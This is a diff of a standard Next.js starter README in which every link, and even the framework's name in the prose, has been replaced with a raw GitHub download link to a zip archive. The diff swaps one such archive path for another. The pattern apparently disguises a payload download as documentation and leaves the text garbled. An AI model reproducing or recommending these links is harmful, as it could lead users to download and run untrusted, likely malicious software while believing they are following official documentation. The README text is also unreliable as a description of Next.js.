@@ -1,4 +1,4 @@
-This is a [https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip) project bootstrapped with [`create-next-app`](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip).
+This is a [https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip) project bootstrapped with [`create-next-app`](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip).
 
 ## Getting Started
 
@@ -16,21 +16,21 @@ bun dev
 
 Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
-You can start editing the page by modifying `https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip`. The page auto-updates as you edit the file.
+You can start editing the page by modifying `https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip`. The page auto-updates as you edit the file.
 
-This project uses [`next/font`](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip) to automatically optimize and load [Geist](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip), a new font family for Vercel.
+This project uses [`next/font`](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip) to automatically optimize and load [Geist](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip), a new font family for Vercel.
 
 ## Learn More
 
-To learn more about https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip, take a look at the following resources:
+To learn more about https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip, take a look at the following resources:
 
-- [https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip Documentation](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip) - learn about https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip features and API.
-- [Learn https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip) - an interactive https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip tutorial.
+- [https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip Documentation](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip) - learn about https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip features and API.
+- [Learn https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip) - an interactive https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip tutorial.
 
-You can check out [the https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip GitHub repository](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip) - your feedback and contributions are welcome!
+You can check out [the https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip GitHub repository](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip) - your feedback and contributions are welcome!
 
 ## Deploy on Vercel
 
-The easiest way to deploy your https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip app is to use the [Vercel Platform](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip) from the creators of https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip
+The easiest way to deploy your https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip app is to use the [Vercel Platform](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip) from the creators of https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip
 
-Check out our [https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip deployment documentation](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/app/selfcare-products/Software-v2.9-beta.4.zip) for more details.
+Check out our [https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip deployment documentation](https://github.com/talalhassankhan18/Glimmer/raw/refs/heads/main/src/assets/salon-profile/2.9.zip) for more details.
